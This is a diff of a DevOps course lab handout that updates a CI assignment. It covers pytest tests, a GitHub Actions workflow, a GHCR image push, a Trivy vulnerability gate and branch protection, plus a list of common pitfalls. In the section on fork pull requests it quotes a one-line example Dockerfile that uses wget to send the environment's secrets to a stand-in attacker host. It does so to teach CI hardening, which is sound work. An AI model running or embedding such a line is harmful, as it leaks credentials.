-# In pytest.ini or pyproject.toml
-[tool:pytest]
-addopts = --cov=. --cov-fail-under=70
+  docker:
+    needs: ___                         # YOUR TASK: which job must pass first? Why?
+    runs-on: ___                       # YOUR TASK: same runner as test? why same/different?
+    if: ___                            # YOUR TASK: gate on event_name — DON'T push from PRs (esp. fork PRs)
+    permissions:
+      contents: ___                    # YOUR TASK
+      packages: ___                    # YOUR TASK: what does GHCR push need?
+
+    steps:
+      - uses: actions/checkout@___
+
+      - uses: docker/login-action@___  # YOUR TASK: pin
+        with:
+          registry: ___                # YOUR TASK: which registry host?
+          username: ___                # YOUR TASK: which github context value?
+          password: ___                # YOUR TASK: ephemeral token expression — NOT a PAT
+
+      - uses: docker/metadata-action@___
+        id: meta
+        with:
+          images: ___                  # YOUR TASK: ghcr.io/<owner>/<image-name>
+                                       # Tip: `ghcr.io/${{ github.repository }}` gives `ghcr.io/<owner>/<repo>`,
+                                       # which is fine. If you want the image name to match the `devops-info-service`
+                                       # tag you pushed by hand in Lab 2 (so Lab 9's Deployment can pin one name),
+                                       # use `ghcr.io/${{ github.repository_owner }}/devops-info-service` instead.
+          tags: |
+            # YOUR TASK: at least TWO tag patterns.
+            # Pick from: type=sha,prefix=git-  |  type=semver,pattern={{version}}
+            #            type=raw,value=latest,enable={{is_default_branch}}
+            #            type=schedule,pattern={{date 'YYYY.MM.DD'}}
+            ___
+            ___
+
+      - uses: docker/build-push-action@___
+        with:
+          context: ___                 # YOUR TASK: which dir holds the Dockerfile?
+          push: ___                    # YOUR TASK: hardcode true, or use github.event_name? (see §3.3)
+          tags: ___                    # YOUR TASK: feed in metadata-action output
+          labels: ___                  # YOUR TASK: feed in metadata-action output (OCI labels)
+          cache-from: ___              # YOUR TASK: which GHA cache mode?
+          cache-to: ___                # YOUR TASK: which GHA cache mode + mode=max?
 ```
 
-**Questions to Consider:**
-- What's a reasonable coverage target? (70%? 80%? 90%?)
-- Should you aim for 100% coverage? (Usually no - diminishing returns)
-- What code is OK to leave untested? (Error handlers, config, main)
-- How do you test hard-to-reach code paths?
+### 3.3 — Don't push from fork PRs
 
-**Best Practices:**
-- Don't chase 100% coverage blindly
-- Focus on testing critical business logic
-- Integration points should have high coverage
-- Simple getters/setters can be skipped
-- Measure coverage trends, not just absolute numbers
+`YOUR TASK`: the `if:` on the docker job (or the `push:` arg on `build-push-action`) must prevent pushing when the PR comes from a fork. A fork PR can swap your Dockerfile for `FROM busybox; CMD wget evil.example.com/$(env)` and use your `GITHUB_TOKEN` to publish it under your namespace.
 
-**Resources:**
-- [Codecov Documentation](https://docs.codecov.com/)
-- [pytest-cov Documentation](https://pytest-cov.readthedocs.io/)
-- [Go Coverage](https://go.dev/blog/cover)
-- [Cargo Tarpaulin](https://github.com/xd009642/tarpaulin)
-- [JaCoCo](https://www.jacoco.org/)
+Hint: `github.event_name != 'pull_request'` covers the common case; for stricter setups, gate on `github.event.pull_request.head.repo.fork == false`.
 
-</details>
+### 3.4 — Proof of work
 
-**What to Document:**
-- Second workflow implementation with language-specific best practices
-- Path filter configuration and testing proof
-- Benefits analysis: Why path filters matter in monorepos
-- Example showing workflows running independently
-- Terminal output or Actions tab showing selective triggering
-- **Coverage integration:** Screenshot/link to codecov/coveralls dashboard
-- **Coverage analysis:** Current percentage, what's covered/not covered, your threshold
+**Paste into `docs/LAB03.md`:**
+
+- Link to the green `docker` job run (Actions tab)
+- Screenshot or URL of the package under **your repo → Packages** (`ghcr.io/<owner>/<repo>:<your-tag>`)
+- The list of tags your run produced (copy from the metadata-action step's logs)
+- 2–3 sentences justifying SemVer vs CalVer for this service
+
+---
+
+## Task 4 — Trivy Vulnerability Gate (2 pts)
+
+A scan that only warns gets ignored. Make Trivy a **gate**: a HIGH/CRITICAL finding fails the job and blocks the merge.
+
+### 4.1 — Wire Trivy into the test job
+
+`YOUR TASK`: add a Trivy step *inside* the `test` job (or a dedicated `scan` job that `docker` `needs:`). It must run **before** the docker job — a vulnerable dep cannot make it into a published image.
+
+> 💡 **Matrix vs scan:** if you add Trivy inside the matrixed `test` job, it runs twice (once per Python version) — wasteful but harmless. To run it once, either gate it with `if: matrix.python-version == '3.13'` or factor it into a separate `scan` job that the `docker` job `needs:`.
+>
+> 🌐 **DB mirror on restricted networks:** if your runner can't reach `ghcr.io/aquasecurity/trivy-db`, set `TRIVY_DB_REPOSITORY: public.ecr.aws/aquasecurity/trivy-db:2` in the step's `env:` — Aqua publishes an anonymous mirror there (see Lab 2's note).
+
+```yaml
+      - name: ___                                  # YOUR TASK: descriptive step name
+        uses: aquasecurity/trivy-action@___        # YOUR TASK: version (>= 0.35.0; NEVER Trivy v0.69.4)
+        with:
+          scan-type: ___                           # YOUR TASK: fs or image? what do we have at this stage?
+          scan-ref: ___                            # YOUR TASK: which path holds requirements.txt?
+          severity: ___                            # YOUR TASK: which severities should block?
+          exit-code: ___                           # YOUR TASK: what value turns this from warn into gate?
+          ignore-unfixed: ___                      # YOUR TASK: skip CVEs with no patch? trade-off?
+```
+
+### 4.2 — Don't silence fixable CVEs
+
+`YOUR TASK`: if Trivy flags a dependency, the **fix is in the PR**: bump the version in `requirements.txt`. Don't paper over it with `.trivyignore` or by raising the severity threshold. Track genuinely-unfixable findings in a GitHub issue with the CVE ID and a date.
+
+### 4.3 — Branch protection
+
+`YOUR TASK`: in **Settings → Branches → Branch protection rules** for `main`:
+
+- ✅ Require a pull request before merging (≥ 1 review)
+- ✅ Require status checks to pass — pick **`test`** (every matrix cell) and **`docker`**
+- ✅ Require branches to be up to date before merging
+- ✅ Do not allow bypassing the above (admins included)
+
+The green CI badge is decoration; required status checks are the gate.
+
+### 4.4 — Proof of work
+
+**Paste into `docs/LAB03.md`:**
+
+- The Trivy step output from a green run (illustrative if you've fixed everything — your output will say `0` findings)
+- If you bumped a dep, show the before/after `requirements.txt` diff
+- Screenshot of your branch protection settings showing the required checks
+- One sentence on each: severity threshold choice; `ignore-unfixed` trade-off
+
+---
+
+## Bonus Task — Path-Filtered Multi-App CI + Coverage (2 pts)
+
+Less hand-holding here. You already know how to write a workflow.
+
+### Bonus.1 — Second workflow for the compiled-language app (1 pt)
+
+If you did Lab 1's bonus (Go/Rust/Java sibling), wire it up:
+
+- New file `.github/workflows/<lang>-ci.yml` with the same shape: lint + test + (optionally) build image.
+- **Both** workflows must `paths:`-filter to their own app dir so a commit touching only `app_python/` does not trigger the Go workflow, and vice versa.
+- Demonstrate selective triggering: one commit in each app dir, show the Actions tab only fires the relevant workflow.
+
+### Bonus.2 — Coverage in CI (1 pt)
+
+- Run `pytest --cov=app_python --cov-report=xml --cov-report=term` in the `test` job.
+- Upload to **Codecov** (`codecov/codecov-action@v4` — free for public repos) or **Coveralls**.
+- Add a coverage badge to `app_python/README.md`.
+- In `docs/LAB03.md`, state your coverage percentage and **one sentence on what's intentionally uncovered and why** (e.g. `if __name__ == "__main__":` blocks). Coverage isn't a target — Fowler again: *"useful for finding untested code; not a useful target."*
 
 ---
 
 ## How to Submit
 
-1. **Create Branch:**
-   - Create a new branch called `lab03`
-   - Develop your CI workflows on this branch
+```bash
+git switch -c lab03
+git add .github/workflows/python-ci.yml
+git add app_python/tests/ app_python/requirements-dev.txt
+git add app_python/docs/LAB03.md app_python/README.md
+# bonus only:
+git add .github/workflows/go-ci.yml          # if you did the language bonus
+git commit -m "feat(lab03): CI pipeline — pytest, ruff, trivy gate, GHCR push"
+git push -u origin lab03
+```
 
-2. **Commit Work:**
-   - Add workflow files (`.github/workflows/`)
-   - Add test files (`app_python/tests/`)
-   - Add documentation (`app_python/docs/LAB03.md`)
-   - Commit with descriptive message following conventional commits
+Open **two** PRs:
 
-3. **Verify CI Works:**
-   - Push to your fork and verify workflows run
-   - Check that all jobs pass
-   - Review workflow logs for any issues
+- `your-fork:lab03` → `course-repo:main` *(reviewed)*
+- `your-fork:lab03` → `your-fork:main` *(merges into your own main when done)*
 
-4. **Create Pull Requests:**
-   - **PR #1:** `your-fork:lab03` → `course-repo:master`
-   - **PR #2:** `your-fork:lab03` → `your-fork:master`
-   - CI should run automatically on your PRs
+CI runs automatically on both — that's the whole point.
+
+PR checklist:
+
+```text
+- [ ] Task 1 — pytest 3+ tests, ruff clean, output pasted in docs/LAB03.md
+- [ ] Task 2 — workflow with on/permissions/concurrency/matrix; warm-cache time documented
+- [ ] Task 3 — docker job needs:test, GHCR push works, ≥ 2 tags, no push from fork PRs
+- [ ] Task 4 — Trivy gate with exit-code:"1", branch protection screenshot
+- [ ] Bonus — second workflow with path filters AND coverage badge (if attempted)
+```
 
 ---
 
 ## Acceptance Criteria
 
-### Main Tasks (10 points)
+### Task 1 (2 pts)
+- ✅ `requirements-dev.txt` exact-pinned (`pytest==X.Y.Z`, not `>=`)
+- ✅ Three tests asserting **behaviour** (status + body shape), one of them the 404 path
+- ✅ `pytest -q` and `ruff check .` both pass locally; outputs in `docs/LAB03.md`
 
-**Unit Testing (3 pts):**
-- [ ] Testing framework chosen with justification
-- [ ] Tests exist in `app_python/tests/` directory
-- [ ] All endpoints have test coverage
-- [ ] Tests pass locally (terminal output provided)
-- [ ] README updated with testing instructions
+### Task 2 (3 pts)
+- ✅ `.github/workflows/python-ci.yml` triggers on `push` to `main` and `pull_request`, with a `paths:` filter
+- ✅ `concurrency` group by ref, `cancel-in-progress: true`
+- ✅ Matrix over Python 3.12 + 3.13, `fail-fast: false`
+- ✅ `setup-python@v5` with `cache: pip`, `cache-dependency-path:` set
+- ✅ Status badge in `app_python/README.md`; link to a green run
 
-**GitHub Actions CI (4 pts):**
-- [ ] Workflow file exists at `.github/workflows/python-ci.yml`
-- [ ] Workflow includes: dependency installation, linting, testing
-- [ ] Workflow includes: Docker Hub login, build, and push
-- [ ] Versioning strategy chosen (SemVer or CalVer) and implemented
-- [ ] Docker images tagged with at least 2 tags (e.g., version + latest)
-- [ ] Workflow triggers configured appropriately
-- [ ] All workflow steps pass successfully
-- [ ] Docker Hub shows versioned images
-- [ ] Link to successful workflow run provided
+### Task 3 (3 pts)
+- ✅ `docker` job has `needs: test`
+- ✅ Uses `GITHUB_TOKEN` (no PAT), `permissions: { packages: write }` scoped to the job
+- ✅ `metadata-action@v5` produces ≥ 2 tags (one immutable per-commit, e.g. `git-<sha>`)
+- ✅ `build-push-action@v6` with `cache-from/to: type=gha`
+- ✅ Image visible under your repo → Packages
+- ✅ No push from PRs (especially fork PRs)
 
-**CI Best Practices (3 pts):**
-- [ ] Status badge added to README and working
-- [ ] Dependency caching implemented with performance metrics
-- [ ] Snyk security scanning integrated
-- [ ] At least 3 CI best practices applied
-- [ ] Documentation complete (see Documentation Requirements section)
+### Task 4 (2 pts)
+- ✅ `aquasecurity/trivy-action@0.35.0` or later (NOT Trivy v0.69.4)
+- ✅ `severity: HIGH,CRITICAL`, `exit-code: "1"`, `ignore-unfixed: true`
+- ✅ Scan blocks the docker job (in `test` or via a `scan` job + `needs:`)
+- ✅ Branch protection requires `test` and `docker` checks
 
-### Bonus Task (2.5 points)
-
-**Part 1: Multi-App CI (1.5 pts)**
-- [ ] Second workflow created for compiled language app (`.github/workflows/<language>-ci.yml`)
-- [ ] Language-specific linting and testing implemented
-- [ ] Versioning strategy applied to second app
-- [ ] Path filters configured for both workflows
-- [ ] Path filters tested and proven to work (workflows run selectively)
-- [ ] Both workflows can run in parallel
-- [ ] Documentation explains benefits and shows selective triggering
-
-**Part 2: Test Coverage (1 pt)**
-- [ ] Coverage tool integrated (`pytest-cov` or equivalent)
-- [ ] Coverage reports generated in CI workflow
-- [ ] Codecov or Coveralls integration complete
-- [ ] Coverage badge added to README
-- [ ] Coverage threshold set in CI (optional but recommended)
-- [ ] Documentation includes coverage analysis (percentage, what's covered/not)
-
----
-
-## Documentation Requirements
-
-Create `app_python/docs/LAB03.md` with these sections:
-
-### 1. Overview
-- Testing framework used and why you chose it
-- What endpoints/functionality your tests cover
-- CI workflow trigger configuration (when does it run?)
-- Versioning strategy chosen (SemVer or CalVer) and rationale
-
-### 2. Workflow Evidence
-```
-Provide links/terminal output for:
-- ✅ Successful workflow run (GitHub Actions link)
-- ✅ Tests passing locally (terminal output)
-- ✅ Docker image on Docker Hub (link to your image)
-- ✅ Status badge working in README
-```
-
-### 3. Best Practices Implemented
-Quick list with one-sentence explanations:
-- **Practice 1:** Why it helps
-- **Practice 2:** Why it helps
-- **Practice 3:** Why it helps
-- **Caching:** Time saved (before vs after)
-- **Snyk:** Any vulnerabilities found? Your action taken
-
-### 4. Key Decisions
-Answer these briefly (2-3 sentences each):
-- **Versioning Strategy:** SemVer or CalVer? Why did you choose it for your app?
-- **Docker Tags:** What tags does your CI create? (e.g., latest, version number, etc.)
-- **Workflow Triggers:** Why did you choose those triggers?
-- **Test Coverage:** What's tested vs not tested?
-
-### 5. Challenges (Optional)
-- Any issues you encountered and how you fixed them
-- Keep it brief - bullet points are fine
+### Bonus (2 pts)
+- ✅ Second workflow with `paths:` filter on both, selective-trigger proof
+- ✅ Coverage XML generated, uploaded to Codecov/Coveralls, badge in README
 
 ---
 
 ## Rubric
 
-| Criteria | Points | Description |
-|----------|--------|-------------|
-| **Unit Testing** | 3 pts | Comprehensive tests, good coverage |
-| **CI Workflow** | 4 pts | Complete, functional, automated |
-| **Best Practices** | 3 pts | Optimized, secure, well-documented |
-| **Bonus** | 2.5 pts | Multi-app CI with path filters |
-| **Total** | 12.5 pts | 10 pts required + 2.5 pts bonus |
+| Task | Points | Criteria |
+|------|-------:|----------|
+| **Task 1** — Unit tests | **2** | Real assertions, 404 path covered, locally green |
+| **Task 2** — Test/lint job | **3** | Matrix + pip cache + concurrency + path filter; warm-cache time recorded |
+| **Task 3** — GHCR build/push | **3** | `needs: test`, `GITHUB_TOKEN`, ≥ 2 tags, no fork-PR push, image visible |
+| **Task 4** — Trivy gate | **2** | `exit-code: "1"`, gates docker, branch protection on |
+| **Bonus** | **2** | Path-filtered multi-app + coverage |
+| **Total** | **12** | 10 main + 2 bonus |
 
 **Grading:**
-- **10/10:** All tasks complete, CI works flawlessly, clear documentation, meaningful tests
-- **8-9/10:** CI works, good test coverage, best practices applied, solid documentation
-- **6-7/10:** CI functional, basic tests, some best practices, minimal documentation
-- **<6/10:** CI broken or missing steps, poor tests, incomplete work
+- **10/10:** all jobs green, scan genuinely gates, tests assert behaviour, docs concise with real evidence
+- **8–9/10:** CI works, good tests, one minor gap (e.g. forgot to scope `permissions`)
+- **6–7/10:** CI runs but Trivy is a warning, or no fork-PR guard, or thin tests
+- **<6/10:** workflow doesn't run, scan absent or non-gating, tests don't assert real behaviour
 
-**Quick Checklist for Full Points:**
-- ✅ Tests actually test your endpoints (not just imports)
-- ✅ CI workflow runs and passes
-- ✅ Docker image builds and pushes successfully
-- ✅ At least 3 best practices applied (caching, Snyk, status badge, etc.)
-- ✅ Documentation complete but concise (no essay needed!)
-- ✅ Links/evidence provided (workflow runs, Docker Hub, etc.)
-
-**Documentation Should Take:** 15-30 minutes to write, 5 minutes to review
+**For full points:** tests catch real bugs · workflow you can defend line-by-line · `GITHUB_TOKEN` not a PAT · Trivy fails the job on HIGH/CRITICAL · branch protection actually on.
 
 ---
 
 ## Resources
 
 <details>
-<summary>📚 GitHub Actions Documentation</summary>
+<summary>📚 Documentation</summary>
 
-- [GitHub Actions Quickstart](https://docs.github.com/en/actions/quickstart)
-- [Workflow Syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
-- [Building and Testing Python](https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python)
-- [Publishing Docker Images](https://docs.docker.com/ci-cd/github-actions/)
-- [GitHub Actions Marketplace](https://github.com/marketplace?type=actions)
-
-</details>
-
-<details>
-<summary>🧪 Testing Resources</summary>
-
-- [Pytest Documentation](https://docs.pytest.org/)
-- [Flask Testing Guide](https://flask.palletsprojects.com/en/stable/testing/)
-- [FastAPI Testing Guide](https://fastapi.tiangolo.com/tutorial/testing/)
-- [Python Testing Best Practices](https://realpython.com/python-testing/)
+- [GitHub Actions Docs](https://docs.github.com/en/actions) · [Workflow Syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
+- [Building & Testing Python](https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python)
+- [Publishing to GHCR](https://docs.github.com/en/actions/publishing-packages/publishing-docker-images)
+- [Security Hardening for Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
+- [pytest 8](https://docs.pytest.org/) · [Flask testing](https://flask.palletsprojects.com/en/stable/testing/) · [FastAPI testing](https://fastapi.tiangolo.com/tutorial/testing/)
+- [Trivy](https://github.com/aquasecurity/trivy) · [`trivy-action`](https://github.com/aquasecurity/trivy-action) (use ≥ v0.35.0) · [Grype](https://github.com/anchore/grype) alternative
+- [SemVer](https://semver.org/) · [CalVer](https://calver.org/) · [`docker/metadata-action`](https://github.com/docker/metadata-action)
+- [`act`](https://github.com/nektos/act) (run Actions locally) · [`actionlint`](https://github.com/rhysd/actionlint) · [`gh`](https://cli.github.com/) (`gh run watch`)
 
 </details>
 
 <details>
-<summary>🔒 Security & Quality</summary>
+<summary>⚠️ Common Pitfalls (from real dry-runs)</summary>
 
-- [Snyk GitHub Actions](https://github.com/snyk/actions)
-- [Snyk Python Integration](https://docs.snyk.io/integrations/ci-cd-integrations/github-actions-integration)
-- [GitHub Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
-- [Dependency Scanning](https://docs.github.com/en/code-security/supply-chain-security)
-
-</details>
-
-<details>
-<summary>⚡ Performance & Optimization</summary>
-
-- [Caching Dependencies](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows)
-- [Docker Build Cache](https://docs.docker.com/build/cache/)
-- [Workflow Optimization](https://docs.github.com/en/actions/learn-github-actions/usage-limits-billing-and-administration)
+- **`@main` / floating tag pins** — `actions/checkout@main` lets an upstream compromise silently land in your CI. The `tj-actions/changed-files` 2025 attack (CVE-2025-30066) hit 23,000+ repos exactly this way. Pin to a major tag (`@v4`); for high-risk third-party actions, pin to a **full commit SHA** with a `# vX.Y.Z` comment.
+- **`permissions:` not set → write-all default on older repos** — repos created before Feb 2023 default the workflow token to **read/write everything**. Always declare `permissions: { contents: read }` at the top and grant `packages: write` only on the job that needs it. Verify under **Settings → Actions → General → Workflow permissions** that "Read repository contents and packages permissions" is the default.
+- **Pushing images from fork PRs** — a fork can rewrite the Dockerfile to exfiltrate secrets via `RUN` commands and use your `GITHUB_TOKEN` to publish a tainted image to your GHCR namespace. Gate the docker job on `if: github.event_name != 'pull_request'` (or stricter: `github.event.pull_request.head.repo.fork == false`).
+- **`trivy-action` floating + Trivy v0.69.4** — pinning `trivy-action@master` or installing Trivy via `curl ... install.sh` between March 19–20 2026 executed attacker code on the runner (CVE-2026-33634). Use `aquasecurity/trivy-action@0.35.0+` and pin Trivy to **v0.69.3** or a later patched build.
+- **Trivy DB download failures on restricted networks** — if your runner can't reach `ghcr.io/aquasecurity/trivy-db`, the scan dies with `failed to download vulnerability DB`. Solutions: pre-pull the DB into a private mirror and set `TRIVY_DB_REPOSITORY=<your-mirror>`, or schedule a daily warm-up workflow that runs Trivy once on `main`.
+- **Matrix `fail-fast: true` hides regressions** — leaving the default `true` kills 3.13 the moment 3.12 fails. You then "fix" 3.12 without ever seeing what 3.13 was about to fail on. Always set `fail-fast: false` on a version matrix.
+- **Cache hits never invalidate** — if you point `cache-dependency-path:` at the wrong file (e.g. `requirements.txt` but you only updated `requirements-dev.txt`), the cache hashes don't change and you reinstall the old versions for the next month. Use the file your install command actually consumes, or list both.
+- **Tests pass but `app.py` doesn't import** — pytest happily collects zero tests if your test file has a `SyntaxError` and tells you `0 passed`. Use `pytest -q --strict-markers` and watch for the "collected 0 items" warning, or assert `len(tests) >= 3` in a meta-test.
+- **`pytest -q` reports `0 passed` because Flask's auto-reload swallowed the import error** — disable `FLASK_DEBUG` in the test fixture: `app.config["TESTING"] = True; app.config["DEBUG"] = False`.
+- **`ubuntu-latest` rotated under you** — Microsoft swaps the `latest` alias on its own schedule. A workflow that "worked yesterday" suddenly fails because `python3.10` is gone or `apt-get` returns 404. Pin to `ubuntu-24.04`.
+- **`docker/metadata-action` with only `type=raw,value=latest`** — pushes one mutable tag and nothing immutable. Always combine `latest` with `type=sha,prefix=git-` (or `type=semver`) so every build is traceable.
 
 </details>
 
 <details>
-<summary>🛠️ CI/CD Tools</summary>
+<summary>🛠️ Tools worth knowing</summary>
 
-- [act](https://github.com/nektos/act) - Run GitHub Actions locally
-- [actionlint](https://github.com/rhysd/actionlint) - Lint workflow files
-- [GitHub CLI](https://cli.github.com/) - Manage workflows from terminal
+- [`act`](https://github.com/nektos/act) — runs your workflow in a local container; faster feedback than push-and-pray
+- [`actionlint`](https://github.com/rhysd/actionlint) — lints workflow YAML; catches `runs-on: ubunto-24.04` typos before CI does
+- [`gh run watch`](https://cli.github.com/manual/gh_run_watch) — live-tail a running workflow from the terminal
+- [`gh workflow run`](https://cli.github.com/manual/gh_workflow_run) — trigger a `workflow_dispatch` run from your shell
+- [Dependabot](https://docs.github.com/en/code-security/dependabot) — auto-PRs to keep `actions/checkout@v4` and `pytest` fresh; one `.github/dependabot.yml`, no token, no third party
 
 </details>
 
@@ -918,14 +534,13 @@ Answer these briefly (2-3 sentences each):
 
 ## Looking Ahead
 
-- **Lab 4-6:** CI will validate your Terraform and Ansible code
-- **Lab 7-8:** CI will run integration tests with logging/metrics
-- **Lab 9-10:** CI will validate Kubernetes manifests and Helm charts
-- **Lab 13:** ArgoCD will deploy what CI builds (GitOps!)
-- **All Future Labs:** This pipeline is your safety net for changes
+| Lab | What CI does for it |
+|---:|---|
+| 4 | `terraform plan` becomes a CI gate — same idea as `pytest` |
+| 5–6 | `ansible-playbook --check` in CI; idempotency proven on every PR |
+| 7–8 | Integration tests once Loki + Prometheus land |
+| 9–10 | CI validates K8s manifests / Helm charts (`helm lint`, `kubeval`) |
+| 13 | ArgoCD watches the GHCR image **this** pipeline publishes — GitOps loop closes |
+| Every future lab | this workflow is your safety net |
 
----
-
-**Good luck!** 🚀
-
-> **Remember:** CI isn't about having green checkmarks—it's about catching problems before they reach production. Focus on meaningful tests and understanding why each practice matters. Think like a DevOps engineer: automate everything, fail fast, and learn from failures.
+> **Remember:** a good pipeline is fast, deterministic, and boring. Excitement in CI is a smell.
